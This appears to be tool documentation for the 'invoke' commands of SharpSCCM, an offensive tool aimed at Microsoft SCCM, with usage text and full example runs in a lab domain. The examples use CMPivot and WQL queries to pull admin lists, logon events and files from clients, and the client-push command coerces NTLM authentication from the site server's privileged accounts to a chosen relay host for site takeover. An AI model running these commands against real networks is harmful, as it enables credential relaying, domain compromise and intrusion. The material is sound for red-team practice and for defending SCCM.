---
description: invoke documentation
title: invoke
---

# Using the "invoke" Command Group

This documentation was last updated on 7/3/24 by Chris Thompson (@_Mayyhem). Please refer to the output of the `--help` option for each command for the most up-to-date usage information.

### Description
A group of commands that execute actions on an SMS Provider

### Usage
```
SharpSCCM invoke [command] [options]

Options:
  -mp, --management-point <management-point>  The IP address, FQDN, or NetBIOS name of the management point to connect
                                              to (default: the current management point of the client running
                                              SharpSCCM)
  -sms, --sms-provider <sms-provider>         The IP address, FQDN, or NetBIOS name of the SMS Provider to connect to
                                              (default: the current management point of the client running SharpSCCM)
  -sc, --site-code <site-code>                The three character site code (e.g., "PS1") (default: the site code of
                                              the client running SharpSCCM)
  --debug                                     Print debug messages for troubleshooting
  --no-banner                                 Do not display banner in command output
  -?, -h, --help                              Show help and usage information
```

### Subcommands
```
  admin-service  Invoke an arbitrary CMPivot query against a collection of clients or a single client via AdminService
  client-push    Force the primary site server to authenticate to an arbitrary destination via NTLM using each configured account and its domain computer account
  query <query>  Execute a given WQL query on an SMS Provider or other server
  update         Force clients to check for updates and execute any new applications that are available
```

---

# invoke admin-service

### Description
  Invoke an arbitrary CMPivot query against a collection of clients or a single client via AdminService
    
### Requirements
  - "Read" and "Run CMPivot" permissions for the "Collections" scope
  - https://learn.microsoft.com/en-us/mem/configmgr/core/servers/manage/cmpivot#permissions

### Usage
```
SharpSCCM invoke admin-service [options]

Options:
  -q, --query <query>                  The query you want to execute against a collection of clients or
                                       single client (e.g., --query "IPConfig")
  -i, --collection-id <collection-id>  The collectionId to point the query to. (e.g., SMS00001 for all
                                       systems collection)
  -r, --resource-id <resource-id>      The unique ResourceID of the device to point the query to. Please see
                                       command "get resourceId" to retrieve the ResourceID for a user or
                                       device
  -d, --delay <delay>                  Seconds between requests when checking for results from the
                                       API,(e.g., --delay 5) (default: requests are made every 5 seconds)
  -re, --retries <retries>             The total number of attempts to check for results from the API before
                                       a timeout is thrown.
                                        (e.g., --timeout 5) (default: 5 attempts will be made before a
                                       timeout
  -j, --json                           Get JSON output
  -sms, --sms-provider <sms-provider>  The IP address, FQDN, or NetBIOS name of the SMS Provider to connect
                                       to (default: the current management point of the client running
                                       SharpSCCM)
  -sc, --site-code <site-code>         The three character site code (e.g., "PS1") (default: the site code
                                       of the client running SharpSCCM)
  --debug                              Print debug messages for troubleshooting
  --no-banner                          Do not display banner in command output
  -?, -h, --help                       Show help and usage information
```
### Examples
Get members of the local Administrators group from a device with resourceID 16777226
```
.\SharpSCCM.exe invoke admin-service -r 16777226 -q "Administrators" -sms site-sms -d 10

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Sending query to AdminService
[+] URL: "https://site-sms/AdminService/v1.0/Device(16777226)/AdminService.RunCMPivot"
[+] OperationId found: 16777463
[+] Attempt 1 of 5: Checking for query operation to complete
[+] URL: "https://site-sms/AdminService/v1.0/Device(16777226)/AdminService.CMPivotResult(OperationId=16777463)"
[+] 10 seconds until next attempt
[+] Attempt 2 of 5: Checking for query operation to complete
[+] URL: "https://site-sms/AdminService/v1.0/Device(16777226)/AdminService.CMPivotResult(OperationId=16777463)"
[+] 10 seconds until next attempt
[+] Successfully retrieved results from AdminService
Device: SITE-SERVER
ObjectClass: User
Name: MAYYHEM\CAS$
PrincipalSource: ActiveDirectory
----------------------------------------
Device: SITE-SERVER
ObjectClass: Group
Name: MAYYHEM\Domain Admins
PrincipalSource: ActiveDirectory
----------------------------------------
Device: SITE-SERVER
ObjectClass: User
Name: MAYYHEM\sccmadmin
PrincipalSource: ActiveDirectory
----------------------------------------
Device: SITE-SERVER
ObjectClass: User
Name: SITE-SERVER\Administrator
PrincipalSource: Local
----------------------------------------
[+] Completed execution in 00:00:21.1354974
```

Get logon events for the last 8 hours from a specified device and display the output in JSON format:
```
.\SharpSCCM.exe invoke admin-service -q "EventLog('Security',8h) | where EventID == 4624 | order by DateTime desc" -r 16777274 -j

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Sending query to AdminService
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.RunCMPivot"
[+] OperationId found: 16795660
[+] Attempt 1 of 5: Checking for query operation to complete
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.CMPivotResult(OperationId=16795660)"
[+] 5 seconds until next attempt
[+] Attempt 2 of 5: Checking for query operation to complete
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.CMPivotResult(OperationId=16795660)"
[+] 5 seconds until next attempt
[+] Attempt 3 of 5: Checking for query operation to complete
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.CMPivotResult(OperationId=16795660)"
[+] 5 seconds until next attempt
[+] Attempt 4 of 5: Checking for query operation to complete
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.CMPivotResult(OperationId=16795660)"
[+] 5 seconds until next attempt
[+] Successfully retrieved results from AdminService

----------------  CMPivot data  ------------------
{
  "value": {
    "Status": "1",
    "MoreResult": false,
    "Result": [
      {
        "EntryType": "SuccessAudit",
        "DateTime": "2023-05-02 17:23:53",
        "Message": "An account was successfully logged on.\r\nSubject:\r\n Security ID:  S-1-5-18\r\n Account Name:  CAVE-JOHNSON-PC$\r\n Account Domain:  APERTURE\r\n Logon ID:  0x3e7\r\nLogon Information:\r\n Logon Type:  5\r\n Restricted Admin Mode: -\r\n Remote Credential Guard: -\r\n Virtual Account:  %%1843\r\n Elevated Token:  %%1842\r\nImpersonation Level:  %%1833\r\nNew Logon:\r\n Security ID:  S-1-5-18\r\n Account Name:  SYSTEM\r\n Account Domain:  NT AUTHORITY\r\n Logon ID:  0x3e7\r\n Linked Logon ID:  0x0\r\n Network Account Name: -\r\n Network Account Domain: -\r\n Logon GUID:  {00000000-0000-0000-0000-000000000000}\r\nProcess Information:\r\n Process ID:  0x37c\r\n Process Name:  C:\\Windows\\System32\\services.exe\r\nNetwork Information:\r\n Workstation Name: -\r\n Source Network Address: -\r\n Source Port:  -\r\nDetailed Authentication Information:\r\n Logon Process:  Advapi  \r\n Authentication Package: Negotiate\r\n Transited Services: -\r\n Package Name (NTLM only): -\r\n Key Length:  0\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n - Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n - Transited services indicate which intermediate services have participated in this logon request.\r\n - Package name indicates which sub-protocol was used among the NTLM protocols.\r\n - Key length indicates the length of the generated session key. This will be 0 if no session key was requested.",
        "Source": "Microsoft-Windows-Security-Auditing",
        "EventID": "4624",
        "Device": "CAVE-JOHNSON-PC"
      },
...<SNIP>...
    ]
  }
}
[+] Completed execution in 00:00:21.3716385
```

Get the contents of a specified file on disk:
```
.\SharpSCCM.exe invoke admin-service -d 10 -q "FileContent('C:\Windows\smscfg.ini')" -r 16777274

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Sending query to AdminService
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.RunCMPivot"
[!] Received a 400 ('Bad request') response from the API. Falling back to SMS Provider method
[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Using provided management point: ATLAS.APERTURE.SCI
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Fallback Method call succeeded
[+] Attempt 1 of 5: Checking for query operation to complete
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.CMPivotResult(OperationId=16795818)"
[+] 10 seconds until next attempt
[+] Attempt 2 of 5: Checking for query operation to complete
[+] URL: "https://ATLAS.APERTURE.SCI/AdminService/v1.0/Device(16777274)/AdminService.CMPivotResult(OperationId=16795818)"
[+] 10 seconds until next attempt
[+] Successfully retrieved results from AdminService
--------------- File Contents ---------------
[Configuration - Client Properties]
SMS SMBIOS Serial Number Identifier=56004D0077006100720065002D00350036002000340064002000390030002000330034002000330063002000310063002000330063002000610032002D0033006200200031006200200062003700200031003300200038003000200063003600200030003300200061003900
SID=S-1-5-21-2572574827-1168181077-1292997567
SMS Hardware Identifier 2=002C0000010000F2
SMS Hardware Identifier=692F0000010000F2
SMS Unique Identifier=GUID:3358674C-7C33-44F2-8496-1A5D3116F7ED
Previous SMSUID=GUID:3358674C-7C33-44F2-8496-1A5D3116F7ED
Last SMSUID Change Date=01/14/2023 16:38:06
SMS Certificate Identifier=SMS;78D612FA1FF127C8C0F8AEA67C6EB6E89AC2D74C
Last Version=5.00.9078.1006
[SMS MultiBoot Configuration]
Number of Opal Installations=1
--------------------------------------------
[+] Completed execution in 00:00:28.0016008
```

---

# invoke client-push
### Description
Force the primary site server to authenticate to an arbitrary destination via NTLM using each configured account and its domain computer account

### Requirements
- Automatic site assignment and site-wide client push installation are enabled
- Fallback to NTLM authentication is not explicitly disabled (default)
- PKI certificates are not required for client authentication (default)

### Usage
```
SharpSCCM invoke client-push [options]

Options:
  -a, --as-admin                       Connect to the server via WMI rather than HTTP to force
                                       authentication (requires Full Administrator access and device record
                                       for target)
  -c, --certificate <certificate>      The encoded X509 certificate blob to use that corresponds to a
                                       previously registered device
  -i, --client-id <client-id>          The SMS client GUID to use that corresponds to a previously
                                       registered device and certificate
  -t, --target <target>                The NetBIOS name, IP address, or if WebClient is enabled on the site
                                       server, the IP address and port (e.g., "192.168.1.1@8080") of the
                                       relay/capture server (default: the machine running SharpSCCM)
  -sms, --sms-provider <sms-provider>  The IP address, FQDN, or NetBIOS name of the SMS Provider to connect
                                       to (default: the current management point of the client running
                                       SharpSCCM)
  -sc, --site-code <site-code>         The three character site code (e.g., "PS1") (default: the site code
                                       of the client running SharpSCCM)
  --debug                              Print debug messages for troubleshooting
  --no-banner                          Do not display banner in command output
  -?, -h, --help                       Show help and usage information
```
### Examples
Create a new device record and data discovery record with the NetBIOS name of the local machine to coerce NTLMv2 authentication from the primary site server's client push installation accounts and computer account:
```
.\SharpSCCM.exe invoke client-push

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
[+] Reusable Base64-encoded certificate:

    308209D20201033082098E06092A864886F70D010701A082097F0482097B308209773082059006092A864886F70D010701A08205810482057D3082057930820575060B2A864886F70D010C0A0102A08204EE308204EA301C060A2A864886F70D010C0103300E0408B9FEEA72C6826C3B020207D0048204C8C2FF01C6BD3332048506CBBB5F28E143FB859CDEBDC83DE57138D731EEF3F123D50334ABF5E7610E4D9760A06CCA1D6CF4631E0D28F86054A0502E55888E506F1605B4E8BAF282E1F88995D8E6AB3F074CC3B2EB6D5101D3279D0990AC6A05CC97F905F800402C0B391947C8287E42EC66CDA79CBC0CAFB50E7346BE62E119F76865CC92540C823AEFDE45B9650BCE4BE3D362AF8D67E10252CDF1E7C08B739C1D4FD7226DD08B5D0338513C940F17113EDD34C6EEC88C6F8BFC498C1D0F64A33CEBDC0ECB3A0CFA5ADC06082FBB0E3F9858E94D53A00F9B08D2C1C39A724FE7D2C8D75DE24478E048F7EFA6B05AA39AED87A37C4276B6213F99B424E7476FEDC3721CBEDBED4F4DE41DEB9CAF97249A4466130456DD977963EDFCFCD436A6614E40731D5765FFDC050A86D4896745C383E08BA94CA7FB1AD43903BCECF964BE9F57EFA2B54AF46D75E47FA10C0D7C95D2943663C30B0184AE47D89CE1B8A1D41F19C3BE87BF23ED258F65213ADF366427DA82FCC36A2521A033F9E70BE596925D72BB5C951F893D8FEA2C0B00D81B99E25F3195F09735789A51C1CFBE57A8097F0B639A3E634463C082AD732987FAD12C62122F80081FE3448889C865F80704CAAA528473ADB8841FF09563F2E7560E0C96BB2776E0EA1004B9197C3E56D1C0A887B74FA6FF352520E88A03AA69768B2A831DB3A463FD07389B8D48F4CDF77E97608990DE0F54A57E20ECB807C0BA297B265179ED20400DA71BADF63D9C27DC49E487D2CB1C950146A80499F1C6C5998331E3E9401DB8A39E77A66244ACB96775F53B92DFEFECBC35BE04BCED1B91653F4CB0C36C5148CB40301EA3E1CC8973E610C38BD8132C15B0C8CE272B991CEF933C5E38398F06954D3591B9739E42AC600AD303E6140A5B2745C6FF15E6825479E2BC6E6F90B3D297EF363A4FC31BDB25B9EEDB39B97237BC9BB3B03BA93EDD1AA94187426877AF60905EAF0653BB7FDBB2F70D76D0BC6A070897D578FB0ECB9B1CA44B65094F77E827B02AEBDA217E18CD67BA27DD32EC2BDFA394FAFD79D6DEA56B8CA66C950170FBF961553BC285B5F6C27F8889938818B2462D32D048DB9D3C5ACB3969E6DE2DBD8A35685BA9A7864C0160562C895F248C0786A57B03DD959AF04A4A9C09BAE0FC1F8DCB5E39B2EE9DF9F41537CC1C96D0952D7A0E5C852FD3388434154B37D529B5F11F44BBB2C5683CFE3D5E83F30AAE8B062C0BB27A51F6AA33F0A68211BAED5E731A5B1622FC6E5799CE7662657E3227D2103AD785B1B1F50021421078D434705F1577D0E4D73245F42C6B7C58F8EBE98ED6590965FF9AE7001C30C86DB2C35E0CB2B100E1579A34B17680C15489E9F834080460726372CE7FD5DD5D34D7D94A0D76206B4C8AF7AF5BB8614017210B0A4A88DCAB65D963983C636E162CF445FEB737B26FAF303A5065316A98B33B68C76F0C0650096B7AB146F65D46CBF6EF8B1B4072E8E9893285A7CDC9E113B5B77C76CD8A93A11BCE5387B5B2B4413C3D1CAA49DFFF858FC486EB0EB0BF415C8F5CB90671A5A87CFB9F23465A9B6720CED39755E35F1E1C2878C3A8717B42E6E950DAC3647EB80C9B6D692C8CEFF3984126AC2833020F177B984E636EBCD76267CBACB9E5E7419F1905E00F052C92B516322A9D66A544B2D9CAB2AE18E6BB41BCAFAE385DC3814EDA4F71EB8F4648CF4EE93C12CC69AC73A63EA4AD20E4853174301306092A864886F70D0109153106040401000000305D06092B060104018237110131501E4E004D006900630072006F0073006F0066007400200053006F0066007400770061007200650020004B00650079002000530074006F0072006100670065002000500072006F00760069006400650072308203DF06092A864886F70D010706A08203D0308203CC020100308203C506092A864886F70D010701301C060A2A864886F70D010C0103300E04088CF98E0589E66C49020207D080820398C5FAE69AD26CE90EEC64F5F292E402BE097EBA8BA53348858F311974BC3FB2CBB613A6A8A6CA1A27453455ACF929CE03583CED6FDCEC19E593148D16CF08659E1340D02267DF027EB3EEB65730D750E6970FC7B63592CCA17BBD439B08D81D6F10B997E1B998D07B7F0CF43F45401554C014001AB0E6E62BE064C4C70FAE5F624D53B49FCD78FBF1EAD386A0288E885BFF9BA80787E3401955EBECC93B9F3A9A161BC7C1DF9090B18D21BE78C42E3C87BF4CDE6EE5A5C464D830DD9F096D4CC9A5A4F952DA99D049251B76E1BCD81848E2BD82B8F290FA2A66345694E4C01BB4D86D6AC63C6E2F222E4ECB0EE2DC81B68166D7DC77C6557FC6F46F9D083934B2B26539767E4BDA0526EF7A1D01BED2D29580773F30274C4781474C81857036D7A2089B04D3C9677E3A9649F77FF57D3F04228B23074B02D7DF2DAFBF8F7B7DE4052E54B5051B38B492B9E99226D0B8906774B28A0AC93B88643999972EE0E71338D7978E09B246E23B4063BA034655A17D7AB1D9B898CD40DD4F06AD1077A03602CDA969F60B27EA35C2CAE508A58907ADFAF0C641CDE865984A01F028053470C819FBAE3D861B0E979E357E656687BD0FCBE376F18D5492168EA97E860E71B604E42BFF10F5D31ED3F282691C232EC99BBBB16A70AFD7E812B65D0C62E4CCF40E758D03BA4B57869BCCF2A3182A7B16DB3BA5C3AC909E4509B6FDF4EEA7A61868BFF5474FE1FBEB7A8CB799893BD83D6C38924C070E3E225C8C8CEAB8DDBC3880E712E5986866EBB103B5013AD294BFE69EE0614C6615B9A91F5D465C2B9D51DE187C5C24ECA7968DAE07E25913CE8E02C719F91F28A0737D90FA526FF8415430B24DD3D22E655CC7570BD54F8E3ED268632FE579E85CD8A5536BB2C785DEC3D33B05D190031A5187582B568D1E33F31DD9A2752814ACA5385BC7FC8916394242FE4F99422DD3AF4542C0B4F594CA4A933FF71F7F6665F50D6C5D5396A3B6F0A45B6D3B4F7D7DF4D96953C1079BA1E2447826981F26290BF421D8FA66806A77AA1135D066327CDBE88E4386D90BE45A3DADB1A64DD287CB919DCD21A4150A21A768FDD27708C2B6AF45E6CA256E5A0ED70AF6B0A8B831E89364C6D6CBC54B9C1970B835C734019BBEEEA17F2C501222E5B52FFB40F32CDC0E11279D43A3D92B151A770B6BA8DD1AFCEEFD24BD1F5A331E1C95EE1B9BDDD105B033CB768A1E6447FC5FEE537EF9FF16C2C79B95AB9B3FF014FBB7373FA06C7BEF546CB9AB171B5D06AA73519C74AEC2ED5835BE6AA47F974953B066148123303B301F300706052B0E03021A0414C536DF6BA7B6DBEDDE708C7DCBA08D4050ABF1240414E6323E7D077665BBFBE1347AD88945622C4D69F1020207D0

[+] Discovering local properties for client registration request
[+] Modifying client registration request properties:
      FQDN: CAVE-JOHNSON-PC.APERTURE
      NetBIOS name: CAVE-JOHNSON-PC
      Site code: PS1
[+] Sending HTTP registration request to ATLAS.APERTURE.SCI:80
[+] Received unique SMS client GUID for new device:

    GUID:22BFD6C6-26E5-4286-BCF5-9589CF452A4B

[+] Discovering local properties for DDR inventory report
[+] Modifying DDR and inventory report properties
[+] Discovered PlatformID: Microsoft Windows NT Server 10.0
[+] Modified PlatformID: Microsoft Windows NT Workstation 2010.0
[+] Sending DDR from GUID:22BFD6C6-26E5-4286-BCF5-9589CF452A4B to MP_DdrEndpoint endpoint on ATLAS.APERTURE.SCI:PS1 and requesting client installation on CAVE-JOHNSON-PC
[+] Completed execution in 00:00:06.6729439
```

### References
- https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a
- https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1

---

# invoke query 

### Description
Execute a given WQL query on an SMS Provider or other server
  
### Requirements
Permitted security roles:
      - ACLs are applied at the object class and instance level

### Usage
```
SharpSCCM invoke query <query> [options]

Arguments:
  <query>  The WQL query to execute

Options:
  -n, --wmi-namespace <wmi-namespace>  The WMI namespace to query (default: "root\SMS\site_<site-code>")
  -sms, --sms-provider <sms-provider>  The IP address, FQDN, or NetBIOS name of the SMS Provider to connect
                                       to (default: the current management point of the client running
                                       SharpSCCM)
  -sc, --site-code <site-code>         The three character site code (e.g., "PS1") (default: the site code
                                       of the client running SharpSCCM)
  --debug                              Print debug messages for troubleshooting
  --no-banner                          Do not display banner in command output
  -?, -h, --help                       Show help and usage information
```
### Examples
Execute the WQL query `SELECT * FROM SMS_Admin` on the SMS Provider (default: check if the current management point is one) in the `root\SMS\site_<sitecode>` WMI namespace:
```
.\SharpSCCM.exe invoke query "SELECT * FROM SMS_Admin"

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT * FROM SMS_Admin
-----------------------------------
SMS_Admin
-----------------------------------
AccountType: 0
AdminID: 16777217
AdminSid: S-1-5-21-3371398565-414029199-3966136581-1110
Categories: SMS00ALL
CategoryNames: All
CollectionNames: All Systems, All Users and User Groups
CreatedBy: APERTURE\sccmadmin
CreatedDate: 20230104011428.000000+000
DisplayName: SCCM Admin
DistinguishedName:
ExtendedData: Can't display Object as a String
IsCovered: False
IsDeleted: False
IsGroup: False
LastModifiedBy: APERTURE\sccmadmin
LastModifiedDate: 20230104011428.000000+000
LogonName: APERTURE\sccmadmin
Permissions: Can't display Object as a String
RoleNames: Full Administrator
Roles: SMS0001R
SKey: PS1S-1-5-21-3371398565-414029199-3966136581-1110
SourceSite: PS1
-----------------------------------
AccountType: 0
AdminID: 16777225
AdminSid: S-1-5-21-3371398565-414029199-3966136581-1103
Categories: SMS00UNA
CategoryNames: Default
CollectionNames: All Systems, All Users and User Groups
CreatedBy: APERTURE\sccmadmin
CreatedDate: 20230112141330.000000+000
DisplayName: Cave Johnson
DistinguishedName: CN=Cave Johnson,CN=Users,DC=APERTURE,DC=SCI
ExtendedData: Can't display Object as a String
IsCovered: True
IsDeleted: False
IsGroup: False
LastModifiedBy: APERTURE\sccmadmin
LastModifiedDate: 20230117213812.000000+000
LogonName: APERTURE\cave.johnson
Permissions: Can't display Object as a String
RoleNames: Full Administrator
Roles: SMS0001R
SKey: PS1S-1-5-21-3371398565-414029199-3966136581-1103
SourceSite: PS1
-----------------------------------
[+] Completed execution in 00:00:02.8874983
```

---

# invoke update

### Description
Force clients to check for updates and execute any new applications that are available
   
### Requirements
Permitted security roles:
  - Full Administrator
  - Operations Administrator

### Usage
```
SharpSCCM invoke update [options]

Options:
  -d, --device <device>                    The name of the device to force to update
  -i, --collection-id <collection-id>      The CollectionID of the collection to force to update
  -p, --policy-type <machine|user>         The type of policy to update (default: "machine")
  -n, --collection-name <collection-name>  The name of the collection to force to update
  -r, --resource-id <resource-id>          The unique ResourceID of the device or user to force to update
  -u, --user <user>                        The UniqueUserName of the user to force to update (e.g.,
                                           "APERTURE\cave.johnson")
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -sc, --site-code <site-code>             The three character site code (e.g., "PS1") (default: the site
                                           code of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```
### Examples
Force all members of the collection with CollectionID `SMSDM003` to retrieve machine policy and execute any new applications available:
```
.\SharpSCCM.exe invoke update -i SMSDM003

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Forcing all members of All Desktop and Server Clients (SMSDM003) to retrieve machine policy and execute any new applications available
[+] Completed execution in 00:00:01.2528668
```